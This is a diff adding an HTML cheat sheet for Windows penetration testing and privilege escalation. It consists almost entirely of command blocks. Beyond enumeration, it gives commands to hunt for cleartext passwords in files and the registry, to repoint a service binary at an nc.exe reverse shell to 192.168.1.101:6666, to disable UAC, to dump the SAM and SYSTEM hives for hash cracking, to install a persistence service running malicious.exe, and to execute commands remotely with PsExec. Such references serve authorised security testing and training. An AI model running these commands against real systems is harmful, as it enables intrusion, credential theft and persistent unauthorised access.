@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Penetration Testing Cheat Sheet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e1e1e;
+            color: #f8f8f2;
+            margin: 0;
+            padding: 20px;
+        }
+        h1, h2 {
+            color: #66d9ef;
+        }
+        code {
+            background-color: #272822;
+            padding: 5px;
+            border-radius: 5px;
+        }
+        pre {
+            background-color: #272822;
+            padding: 10px;
+            border-radius: 5px;
+            overflow: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>Windows Penetration Testing Cheat Sheet</h1>
+
+    <h2>1. Basics</h2>
+    <pre><code>systeminfo                       # System information
+hostname                        # Hostname of the machine
+</code></pre>
+
+    <h2>2. Who Am I?</h2>
+    <pre><code>whoami                          # Current user
+echo %username%                 # Display the current username
+</code></pre>
+
+    <h2>3. User and Group Information</h2>
+    <pre><code>net users                       # List all users on the machine
+net localgroups                  # List all local groups
+net user user1                  # More info about a specific user
+net group /domain               # View Domain Groups
+net group /domain &lt;Group Name&gt;  # View members of a specific domain group
+</code></pre>
+
+    <h2>4. Firewall Configuration</h2>
+    <pre><code>netsh firewall show state       # Show firewall state
+netsh firewall show config      # Show firewall configuration
+</code></pre>
+
+    <h2>5. Network Configuration</h2>
+    <pre><code>ipconfig /all                  # Display full network configuration
+route print                     # Show routing table
+arp -A                          # View the ARP table
+netstat -ano                    # List active connections and listening ports
+</code></pre>
+
+    <h2>6. Patch and Update Status</h2>
+    <pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn  # Check installed updates
+</code></pre>
+
+    <h2>7. Cleartext Passwords</h2>
+    <pre><code># Search for passwords
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+dir /s *pass* *cred* *vnc* *.config*
+findstr /spin "password" *.*
+
+# Common files for passwords
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+# Registry search for passwords
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+</code></pre>
+
+    <h2>8. Identify Services Available Internally</h2>
+    <pre><code>netstat -ano                    # Look for LISTENING services
+</code></pre>
+    <p>Interpreting netstat output:</p>
+    <ul>
+        <li><code>0.0.0.0</code>: Listening on all interfaces (accessible from outside)</li>
+        <li><code>127.0.0.1</code>: Listening only for local connections</li>
+        <li><code>192.168.1.9</code>: Listening for local network connections only</li>
+    </ul>
+
+    <h2>9. Kernel Exploits</h2>
+    <pre><code># Identify hotfixes/patches
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+</code></pre>
+
+    <h2>10. Scheduled Tasks</h2>
+    <pre><code>schtasks /query /fo LIST /v
+</code></pre>
+    <p>Process scheduled task output for SYSTEM privileges:</p>
+    <pre><code>cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+</code></pre>
+
+    <h2>11. Change UPnP Service Binary</h2>
+    <pre><code>sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+</code></pre>
+
+    <h2>12. Weak Service Permissions</h2>
+    <pre><code># List services and check permissions
+wmic service list brief
+sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+</code></pre>
+    <p>Check permissions of services:</p>
+    <pre><code>FOR /F %i in (Servicenames.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+cacls "C:\path\to\file.exe"  # Check file permissions
+</code></pre>
+
+    <h2>13. Unquoted Service Paths</h2>
+    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+sc query | findstr /i "SERVICE_NAME:"
+</code></pre>
+
+    <h2>14. Bypass User Account Control (UAC)</h2>
+    <pre><code>reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f  # Disable UAC
+</code></pre>
+
+    <h2>15. Password Hashes Extraction</h2>
+    <pre><code># Extract NTLM hashes (with administrative privileges)
+reg save HKLM\SAM C:\Users\Public\sam
+reg save HKLM\SYSTEM C:\Users\Public\system
+</code></pre>
+    <p>Use <code>pwdump</code> or <code>hashcat</code> to crack hashes afterwards.</p>
+
+    <h2>16. File System Enumeration</h2>
+    <pre><code>dir /s /b c:\*.* | findstr /i ".exe"      # Search for executables
+dir /s /b c:\*.* | findstr /i ".dll"      # Search for DLLs
+</code></pre>
+
+    <h2>17. Persistence Mechanisms</h2>
+    <pre><code># Create a new service
+sc create MyService binpath= "C:\path\to\malicious.exe"
+sc start MyService
+</code></pre>
+
+    <h2>18. Remote Access Tools</h2>
+    <pre><code># Using PsExec to execute commands remotely
+psexec \\target_ip -u username -p password cmd.exe
+</code></pre>
+
+    <h2>Notes</h2>
+    <p>Always obtain permission before testing or exploiting any systems.</p>
+    <p>This cheat sheet is intended for educational purposes and to enhance your knowledge of penetration testing methodologies.</p>
+</body>
+</html>
